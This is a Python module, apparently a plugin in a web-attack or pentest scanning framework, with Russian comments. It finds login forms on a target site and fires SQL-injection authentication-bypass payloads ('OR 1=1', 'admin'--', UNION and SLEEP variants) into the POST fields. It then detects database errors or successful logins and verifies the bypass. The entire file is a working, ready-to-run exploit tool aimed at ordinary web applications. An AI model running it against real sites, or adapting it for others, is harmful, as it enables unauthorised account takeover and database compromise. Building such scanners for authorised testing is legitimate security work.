"""sqli_post v3 — auto-discover login forms + SQLi in POST fields"""
import re
from urllib.parse import urljoin, urlparse
from core.http import HttpClient


# Признаки форм логина (по имени полей)
USER_FIELDS = ["uid", "username", "user", "email", "login", "uname", "account"]
PASS_FIELDS = ["passw", "password", "pass", "pwd", "passwd", "secret"]

# Признаки успеха (в заголовках и HTML)
SUCCESS_MARKERS = [
    "logout", "sign out", "sign-out", "log out", "dashboard", "my account",
    "welcome", "administrator", "admin panel", "profile",
]

# Payload'ы для SQLi bypass
BYPASS_PAYLOADS = [
    "' OR '1'='1",
    "admin'--",
    "admin'#",
    "' OR 1=1--",
    "' OR 'x'='x",
    "') OR ('1'='1",
    "' UNION SELECT NULL--",
    "' OR SLEEP(3)--",
]

ERROR_MARKERS = [
    "sql syntax", "mysql_fetch", "ora-", "postgresql", "sqlstate",
    "unclosed quotation", "quoted string", "syntax error",
    "jdbc", "java.sql", "odbc", "microsoft ole db",
]


class SqliPost:
    def run(self, session, logger):
        target = session.target
        base_url = target.split("?")[0] if "?" in target else target

        # если задан --extra post=uid=x&passw=y — использовать как есть
        forced_post = None
        forced_action = None
        for x in session.extra:
            if x.startswith("post="):
                forced_post = x[5:]
            elif x.startswith("action="):
                forced_action = x.split("=", 1)[1]

        print(f"[sqli_post] target: {base_url}")

        # === Discover login forms ===
        forms = self._discover_forms(base_url, session, logger)
        if forced_action:
            forms.append({"action": forced_action, "fields": ["uid", "passw"]})

        if not forms:
            print("[sqli_post] No login forms found")
            print("  hint: указать --extra action=/login --extra post=user=x&pass=y")
            return {"findings": []}

        print(f"[sqli_post] found {len(forms)} forms")
        for f in forms:
            print(f"  {f['action']} — fields: {f['fields']}")

        # === Test each form ===
        findings = []
        for form in forms:
            action = form["action"]
            user_field = form["user_field"]
            pass_field = form["pass_field"]

            print(f"\n[sqli_post] testing form: {action}")
            print(f"  user_field={user_field} pass_field={pass_field}")

            url = urljoin(base_url, action)
            http = HttpClient(session, logger)

            # baseline — неверные данные
            base_data = {user_field: "x_test_user", pass_field: "x_test_pass"}
            base = http.post(url, data=base_data)
            if not base:
                continue
            base_has_success = self._has_success(base)

            # try bypass payloads on each field
            for field in [user_field, pass_field]:
                for payload in BYPASS_PAYLOADS:
                    data = {user_field: "admin", pass_field: "x"}
                    data[field] = payload
                    r = http.post(url, data=data, allow_redirects=True)
                    if not r:
                        continue

                    # check error
                    low = r.text.lower()
                    err = next((m for m in ERROR_MARKERS if m in low), None)
                    if err:
                        print(f"    ✓ SQL ERROR in {field}: {payload[:30]} → {err}")
                        findings.append({"field": field, "payload": payload,
                                         "type": "error", "marker": err})
                        logger.finding("sqli_post_error", "high",
                                       f"{field}={payload[:40]} ({err})")
                        break

                    # check bypass (success marker появился где baseline не имел)
                    if not base_has_success and self._has_success(r):
                        print(f"    ✓ BYPASS in {field}: {payload[:30]}")
                        findings.append({"field": field, "payload": payload,
                                         "type": "auth_bypass"})
                        logger.finding("sqli_post_bypass", "critical",
                                       f"{field}={payload[:40]}")
                        break

            # verification: 2nd attempt with mutated payload if bypass found
            if any(f["type"] == "auth_bypass" for f in findings):
                print(f"  [verify] повторная проверка bypass")
                for payload in ["' OR '1'='1", "' OR 1=1--"]:
                    data = {user_field: "admin", pass_field: payload}
                    r = http.post(url, data=data)
                    if r and self._has_success(r):
                        logger.finding("sqli_post_verified", "critical",
                                       f"bypass verified on {action}")
                        print(f"    ✓ VERIFIED: {payload[:30]}")
                        break

        print(f"\n[sqli_post] total: {len(findings)} findings")
        return {"findings": findings}

    def _discover_forms(self, base_url, session, logger):
        """Найти формы логина на странице + общих путях."""
        from core.http import HttpClient
        http = HttpClient(session, logger)
        forms = []

        # 1. главная + типовые пути
        paths = ["", "/login", "/login.jsp", "/signin", "/admin", "/admin/login",
                 "/user/login", "/auth/login"]

        for path in paths:
            url = base_url.rstrip("/") + path if path else base_url
            r = http.get(url)
            if not r or r.status_code != 200:
                continue

            # парсим все формы
            for m in re.finditer(r'<form[^>]*>(.*?)</form>', r.text, re.I | re.S):
                form_html = m.group(0)
                action = self._extract_action(form_html, url)
                fields = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', form_html, re.I)
                fields = [f for f in fields if f.lower() not in ("submit", "btnsubmit", "btn")]

                user_field, pass_field = self._identify_fields(fields)
                if user_field and pass_field:
                    if action not in [f["action"] for f in forms]:
                        forms.append({
                            "action": action,
                            "fields": fields,
                            "user_field": user_field,
                            "pass_field": pass_field,
                        })

        return forms

    def _extract_action(self, form_html, page_url):
        m = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
        action = m.group(1) if m else ""
        if not action:
            return page_url
        return action

    def _identify_fields(self, fields):
        """Определить user_field и pass_field."""
        uf = pf = None
        low_fields = [f.lower() for f in fields]
        for orig, low in zip(fields, low_fields):
            if any(k in low for k in ["pass", "pwd", "secret"]):
                pf = orig
            elif any(k in low for k in ["user", "uid", "email", "login", "uname", "account"]):
                uf = orig
        # fallback: первое = user, второе = pass
        if not uf and fields:
            uf = fields[0]
        if not pf and len(fields) > 1:
            pf = fields[1]
        return uf, pf

    def _has_success(self, response):
        """Проверить признаки успешного логина."""
        loc = response.headers.get("Location", "")
        set_cookie = response.headers.get("Set-Cookie", "")
        text = response.text.lower()[:3000]

        # redirect на main/dashboard, а не login
        if loc and any(k in loc.lower() for k in ["main", "dashboard", "account", "profile"]):
            return True
        if loc and "login" in loc.lower():
            return False

        # session cookie после логина
        if "set-cookie" in str(response.headers).lower():
            if any(k in set_cookie.lower() for k in ["session", "auth", "token", "sid"]):
                # не считать, если в body есть форма логина
                if "type=\"password\"" not in text:
                    return True

        # HTML-маркеры
        for m in SUCCESS_MARKERS:
            if m in text and "type=\"password\"" not in text:
                return True
        return False
